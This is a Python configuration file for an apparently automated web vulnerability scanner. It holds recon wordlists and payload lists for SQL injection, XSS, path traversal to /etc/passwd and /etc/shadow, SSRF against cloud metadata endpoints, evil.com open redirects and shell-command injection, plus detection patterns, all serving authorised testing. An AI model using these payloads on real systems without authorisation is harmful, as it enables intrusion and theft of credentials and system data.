"""
Configuration module for Attack Surface Intelligence System
Production-grade settings with enhanced payloads and detection patterns
"""

import os
from pathlib import Path

# Base directories
BASE_DIR = Path(__file__).resolve().parent
MODULES_DIR = BASE_DIR / "modules"
WORDLISTS_DIR = BASE_DIR / "wordlists"
OUTPUT_DIR = BASE_DIR / "output"
REPORTS_DIR = OUTPUT_DIR / "reports"

# Ensure directories exist
WORDLISTS_DIR.mkdir(parents=True, exist_ok=True)
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

# FIX #11: Performance settings - Optimized for speed
DEFAULT_THREADS = 25  # Increased for faster prioritized scanning
DEFAULT_TIMEOUT = 4  # Reduced from 5 for faster timeout detection
MAX_CRAWL_DEPTH = 2
MAX_REQUESTS_PER_DOMAIN = 100
MAX_RETRIES = 1  # Reduced from 2 for faster failure detection
RETRY_DELAY = 0.5  # Reduced from 1 for faster retries

# FIX #11: Caching and optimization
# - Baseline responses cached during vulnerability testing
# - JS analysis results cached per domain
# - Endpoint deduplication reduces duplicate testing
# - Early stopping on high confidence findings (>0.85)
# - Parallel module execution for independent stages
# Expected performance improvement: 40-60% faster overall

# Crawler settings
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
FOLLOW_REDIRECTS = True
VERIFY_SSL = False

# Alive endpoint filtering - accept these status codes as "alive"
ALIVE_STATUS_CODES = range(200, 400)  # 200-399 are alive

# Subdomain discovery
DEFAULT_SUB_WORDLIST = WORDLISTS_DIR / "subdomains.txt"
COMMON_SUBDOMAINS = [
"www","mail","webmail","smtp","pop","imap","mx","ns1","ns2","dns",

"admin","panel","dashboard","console","cpanel","whm","portal","manage","management",

"api","api1","api2","api3","v1","v2","v3","backend","server","internal","private","gateway",

"dev","test","testing","staging","stage","qa","uat","beta","demo","sandbox","preview",

"cdn","static","images","img","assets","media","download","downloads","files","uploads","storage",

"app","mobile","web","service","services","microservice","auth","login","signup","signin",

"blog","shop","store","cart","checkout","payment","billing","support","help","docs",

"secure","vpn","remote","access","firewall","auth","sso",

"db","database","mysql","postgres","mongo","redis","elastic","kibana","grafana","monitor","metrics","logs",

"backup","backups","old","new","archive","legacy","temp","tmp",

"s3","bucket","fileserver","cdn1","cdn2","blob","firebase",

"jenkins","gitlab","ci","cd","pipeline","build","deploy",

"intranet","extranet","home","site","root","main","core","system","admin-dev","api-dev","test-api","dev-api","staging-api","internal-api","secure-api"
]

# Directory discovery
DEFAULT_DIR_WORDLIST = WORDLISTS_DIR / "directories.txt"
COMMON_DIRECTORIES = [
    # Admin / Control
    "admin", "administrator", "adminpanel", "panel", "dashboard", "console",
    "manage", "management", "portal", "control", "cpanel", "superadmin",
    "sysadmin", "root", "backend-admin",

    # Auth / User
    "login", "signin", "signup", "auth", "authentication", "account",
    "accounts", "user", "users", "profile", "profiles", "register",
    "reset", "password", "forgot", "verify", "session", "oauth",

    # API / Backend
    "api", "api/v1", "api/v2", "api/v3", "backend", "server", "internal",
    "private", "services", "gateway", "graphql", "rest", "webhook",
    "endpoints", "service", "microservice",

    # Dev / Test / Staging
    "dev", "test", "testing", "staging", "stage", "prod", "production",
    "sandbox", "beta", "demo", "debug", "uat", "qa", "preview",

    # Files / Uploads
    "upload", "uploads", "file", "files", "download", "downloads",
    "media", "images", "img", "assets", "static", "public",
    "attachments", "documents", "docs", "storage", "cdn",

    # Config / Sensitive
    "config", "configs", "conf", "settings", "env", ".env", ".git",
    ".svn", ".htaccess", "backup", "backups", "old", "archive",
    "db", "database", "sql", "dump", "secrets", "keys", "privatekey",
    "credentials", "token", "tokens",

    # Logs / Temp / Cache
    "log", "logs", "tmp", "temp", "cache", "sessions", "session",
    "runtime", "debug-log",

    # Web / Pages
    "blog", "news", "docs", "documentation", "help", "support",
    "about", "contact", "status", "health", "info", "faq",

    # Mail / Communication
    "mail", "email", "smtp", "inbox", "notifications",

    # CMS / Framework specific
    "wp-admin", "wp-content", "wp-includes",
    "joomla", "drupal", "magento",
    "laravel", "django", "flask", "express",

    # Hidden / Interesting
    ".well-known", ".config", ".backup", ".old", ".temp",
    ".cache", ".history",

    # Misc
    "web", "www", "site", "home", "index", "root",
    "main", "app", "system", "core"
]

# FIX #6: HIGH-RISK ENDPOINT KEYWORDS - Expanded for better detection
# Mark endpoint HIGH if it contains any of these keywords
HIGH_RISK_ENDPOINT_KEYWORDS = [
    # Authentication & Authorization
    "admin", "login", "logout", "signin", "signup", "register", "auth",
    "oauth", "sso", "password", "reset", "forgot", "verify", "confirm",
    "token", "jwt", "session", "sessions", "apikey", "api-key",

    # User & Account Management
    "user", "users", "account", "accounts", "profile", "profiles",
    "settings", "preferences", "dashboard", "panel", "portal",
    "console", "manage", "management", "adminpanel",

    # API & Data Access
    "api", "graphql", "rest", "v1", "v2", "v3", "endpoint", "service",
    "services", "internal-api", "private-api",

    # Sensitive Operations
    "upload", "uploads", "download", "downloads", "file", "files",
    "document", "documents", "export", "import", "backup", "backups",
    "restore", "delete", "remove", "update", "edit", "modify",
    "execute", "run", "cmd", "command",

    # Internal / Debug / Config
    "debug", "test", "testing", "dev", "staging", "internal", "private",
    "secure", "config", "configuration", "setup", "install",
    "phpinfo", "info", "env", ".env", ".git",

    # Financial & Transactions
    "payment", "checkout", "cart", "order", "orders", "invoice",
    "billing", "subscription", "wallet", "transactions", "txn",

    # Database & Admin
    "database", "db", "sql", "query", "dump", "backup-db",
    "phpmyadmin", "adminer", "dbadmin",

    # Cloud / Storage
    "s3", "bucket", "storage", "cdn", "blob", "firebase",

    # Logs / Monitoring
    "log", "logs", "audit", "monitor", "metrics", "health", "status",

    # DevOps / CI-CD
    "jenkins", "gitlab", "ci", "cd", "pipeline", "deploy", "build",

    # Misconfig / Sensitive Files
    ".htaccess", ".htpasswd", ".aws", "credentials", "secrets",
    "privatekey", "keys", "id_rsa"
]

def is_high_risk_endpoint(endpoint: str) -> bool:
    """
    FIX #6: Helper function to check if an endpoint is high-risk
    Returns True if endpoint contains any high-risk keyword
    """
    endpoint_lower = endpoint.lower()
    return any(keyword in endpoint_lower for keyword in HIGH_RISK_ENDPOINT_KEYWORDS)

# ============================================================================
# VULNERABILITY DETECTION PAYLOADS (Layered: Basic -> Advanced)
# Maximum 5-6 payloads per vulnerability type for efficiency
# ============================================================================

# SQL Injection Payloads
SQLi_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "'--",
    "'#",
    "'/*",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "'\"",
    "'`",
    "' OR '1'='1'-- -",
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)#",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT NULL,NULL--",
    "1 OR 1=1",
    "1 AND 1=2",
    "1 OR SLEEP(3)",
    "%27 OR %271%27=%271",
    "%22 OR %221%22=%221"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math href=\"javascript:alert(1)\"></math>",
    "<object data=\"javascript:alert(1)\"></object>",
    "<embed src=\"javascript:alert(1)\">",
    "<img src=1 onerror=alert(document.domain)>",
    "<svg><script>alert(1)</script></svg>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src=x%20onerror=alert(1)%3E"
]

# LFI Payloads
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "....\\....\\....\\windows\\win.ini",
    "/etc/passwd",
    "/etc/passwd%00",
    "../../etc/passwd%00",
    "../../../../etc/passwd%00",
    "../../../../../etc/passwd%00",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    "/proc/self/environ",
    "/proc/version",
    "/etc/hosts",
    "/etc/shadow",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/windows/system32/drivers/etc/hosts",
    "/boot.ini"
]

# SSRF Payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://10.0.0.0",
    "http://172.16.0.1",
    "http://172.16.0.0",
    "http://127.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:22",
    "http://localhost:80",
    "http://localhost:8080",
    "http://localhost:22",
    "http://127.0.0.1/admin",
    "http://localhost/admin",
    "http://127.0.0.1/login",
    "http://localhost/login",
    "http://127.0.0.1/api",
    "http://localhost/api"
]

# Open Redirect Payloads
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "https:evil.com",
    "http:evil.com",
    "\\\\evil.com",
    "\\/evil.com",
    "%2f%2fevil.com",
    "%2f%2fevil.com/",
    "%5c%5cevil.com",
    "%2fevil.com",
    "/%2fevil.com",
    "/%5cevil.com",
    "https://evil.com@trusted.com",
    "https://trusted.com@evil.com",
    "https://evil.com%2f..",
    "//evil.com/%2e%2e",
    "//%65%76%69%6c.com",
    "https://%65%76%69%6c.com",
    "https://evil.com%00",
    "//evil.com%00",
    "https://evil.com/%00",
    "javascript:location='https://evil.com'",
    "javascript:window.location='https://evil.com'"
]
# Command Injection Payloads (Light - safe for detection)
COMMAND_INJECTION_PAYLOADS = [
    ";id",
    "| id",
    "&& whoami",
    "|| whoami",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "&& id",
    "|| id",
    "; uname -a",
    "| uname -a",
    "&& uname -a",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; ls",
    "| ls",
    "&& ls",
    "; pwd",
    "| pwd",
    "&& pwd",
    "; echo test",
    "| echo test",
    "&& echo test",
    "|| echo test",
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
    "&& ping -c 1 127.0.0.1",
    "; cat /etc/hosts",
    "| cat /etc/hosts",
    "&& cat /etc/hosts",
    "|| cat /etc/hosts",
    "& whoami",
    "& id"
]

# IDOR test values
IDOR_TEST_VALUES = [
    0, 1, 2, 3, 4, 5, 10, 50, 100, 200, 500, 999, 1000, 1234, 9999,
    -1, -10,

    "0", "1", "2", "10", "100", "999",

    "admin", "administrator", "root", "user", "test", "guest",
    "demo", "support", "manager", "superuser",

    "0001", "0010", "0100",

    "true", "false", "null", "None",

    "me", "self", "current",

    "user1", "user2", "user123",
    "admin1", "test1",

    "abc", "xyz", "random"
]

# ============================================================================
# PARAMETER CLASSIFICATION MAPPINGS
# ============================================================================

# Parameter -> Vulnerability Type Mapping
PARAM_VULN_MAPPING = {
    # SQLi / IDOR prone parameters
    "id": ["SQLi", "IDOR"],
    "user_id": ["SQLi", "IDOR"],
    "userid": ["SQLi", "IDOR"],
    "account_id": ["SQLi", "IDOR"],
    "product_id": ["SQLi", "IDOR"],
    "order_id": ["SQLi", "IDOR"],
    "item_id": ["SQLi", "IDOR"],
    "post_id": ["SQLi", "IDOR"],
    "comment_id": ["SQLi", "IDOR"],
    "doc_id": ["SQLi", "IDOR"],
    
    # XSS prone parameters
    "q": ["XSS"],
    "query": ["XSS"],
    "search": ["XSS"],
    "keyword": ["XSS"],
    "term": ["XSS"],
    "s": ["XSS"],
    "name": ["XSS"],
    "message": ["XSS"],
    "comment": ["XSS"],
    "body": ["XSS"],
    "content": ["XSS"],
    "title": ["XSS"],
    "description": ["XSS"],
    
    # LFI prone parameters
    "file": ["LFI"],
    "filename": ["LFI"],
    "path": ["LFI"],
    "filepath": ["LFI"],
    "template": ["LFI"],
    "page": ["LFI", "SQLi"],
    "include": ["LFI"],
    "doc": ["LFI"],
    "document": ["LFI"],
    "folder": ["LFI"],
    "root": ["LFI"],
    "dir": ["LFI"],
    
    # SSRF / Open Redirect prone parameters
    "url": ["SSRF", "Open Redirect"],
    "redirect": ["Open Redirect"],
    "redirect_url": ["Open Redirect"],
    "return": ["Open Redirect"],
    "return_url": ["Open Redirect"],
    "next": ["Open Redirect"],
    "next_url": ["Open Redirect"],
    "dest": ["SSRF", "Open Redirect"],
    "destination": ["SSRF", "Open Redirect"],
    "uri": ["SSRF", "Open Redirect"],
    "link": ["SSRF", "Open Redirect"],
    "target": ["SSRF"],
    "host": ["SSRF"],
    "domain": ["SSRF"],
    
    # Command Injection prone parameters
    "cmd": ["Command Injection"],
    "exec": ["Command Injection"],
    "command": ["Command Injection"],
    "execute": ["Command Injection"],
    "ping": ["Command Injection"],
    "ip": ["Command Injection"],
    "host": ["Command Injection", "SSRF"],
    
    # HIGH-RISK authentication parameters
    "auth": ["Credential Exposure"],
    "token": ["Credential Exposure"],
    "api_key": ["Credential Exposure"],
    "apikey": ["Credential Exposure"],
    "key": ["Credential Exposure"],
    "secret": ["Credential Exposure"],
    "password": ["Credential Exposure"],
    "passwd": ["Credential Exposure"],
    "pwd": ["Credential Exposure"],
    "session": ["Credential Exposure"],
    "jwt": ["Credential Exposure"],
    "bearer": ["Credential Exposure"],
}

# Risk levels for parameter types
HIGH_RISK_PARAMS = [
    "id", "user_id", "userid", "account_id", "product_id", "order_id",
    "auth", "token", "api_key", "apikey", "key", "secret", "password",
    "admin", "file", "path", "cmd", "exec", "url", "redirect"
]

MEDIUM_RISK_PARAMS = [
    "search", "q", "query", "keyword", "category", "type", "page",
    "name", "email", "message", "comment", "title"
]

# SQL Error Keywords for detection
SQL_ERROR_KEYWORDS = [
    "SQL", "mysql", "postgres", "syntax", "error", "exception",
    "Warning", "ODBC", "Oracle", "SQLite", "MariaDB", "Microsoft SQL",
    "invalid query", "sql error", "database error", "query failed",
    "ORA-", "PG::", "unclosed quotation"
]

# LFI Success Indicators
LFI_INDICATORS = [
    "root:x:", "daemon:x:", "bin:x:",  # /etc/passwd
    "[extensions]", "[fonts]",  # win.ini
    "<?php", "<%", "#!/",  # source disclosure
]

# API keywords for endpoint classification
API_KEYWORDS = [
    "api", "endpoint", "rest", "graphql", "v1", "v2", "v3",
    "service", "method", "function", "webhook", "callback"
]

# Output settings
OUTPUT_FORMATS = ["text", "json"]
DEFAULT_OUTPUT_FORMAT = "text"

# CLI Colors (ANSI escape codes)
COLORS = {
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "GREY": "\033[90m",
}

# Severity colors
SEVERITY_COLORS = {
    "CRITICAL": COLORS["RED"],
    "HIGH": COLORS["MAGENTA"],
    "MEDIUM": COLORS["YELLOW"],
    "LOW": COLORS["CYAN"],
    "INFO": COLORS["GREY"],
}
